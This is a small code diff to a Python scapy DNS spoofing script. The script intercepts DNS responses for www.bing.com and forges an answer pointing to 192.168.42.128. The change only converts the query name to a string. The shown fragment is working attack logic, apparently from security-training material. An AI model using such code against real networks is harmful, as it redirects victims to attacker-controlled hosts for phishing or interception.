@@ -9,7 +9,7 @@ import scapy.all as scapy
 def process_packet(packet):
     scapyPacket = scapy.IP(packet.get_payload())
     if scapyPacket.haslayer(scapy.DNSRR):
-        qname = scapyPacket[scapy.DNSQR].qname
+        qname = str(scapyPacket[scapy.DNSQR].qname)
         if "www.bing.com" in qname:
             print("[+] Spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdata="192.168.42.128")
